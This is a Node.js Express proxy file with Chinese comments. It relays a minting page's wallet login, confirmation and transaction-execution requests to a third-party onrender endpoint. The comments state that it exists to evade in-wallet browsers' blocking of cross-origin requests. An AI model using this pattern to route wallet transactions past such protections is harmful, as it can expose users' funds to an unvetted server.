// 同域代理：把币安 Agentic Wallet 的请求转发到 onrender，避免钱包内置浏览器（TP 等）拦截跨域请求。
// 部署在你的云服务器上，和铸造页共用同一个域名 → 浏览器认为是同域请求，TP 不会拦。
const express = require("express");
const app = express();
app.use(express.json({ limit: "1mb" }));

// 目标：原页面直连的 onrender 接口
const TARGET = "https://agent-ai-agentic-wallet.onrender.com/api/agent-wallet";

// 铸造页会 POST 到这里（action 可能是 login / confirm / wallet / preview / execute）
app.post("/api/agent-wallet", async (req, res) => {
  // confirm 是长轮询（等币安 App 确认），可能要几十秒，给足超时
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 120000);
  try {
    const upstream = await fetch(TARGET, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(req.body || {}),
      signal: ctrl.signal,
    });
    const text = await upstream.text();
    res.status(upstream.status);
    res.set("Content-Type", "application/json");
    res.set("Cache-Control", "no-store");
    res.send(text); // 原样转发 Agentic 返回的 JSON
  } catch (e) {
    res.status(502).json({ error: "proxy upstream error: " + e.message });
  } finally {
    clearTimeout(timer);
  }
});

// 健康检查
app.get("/api/agent-wallet/ping", (_req, res) => res.json({ ok: true }));

// 可选：直接用 Node 托管铸造页静态文件（不依赖 nginx 时也行）
// app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Agentic proxy listening on :" + PORT));
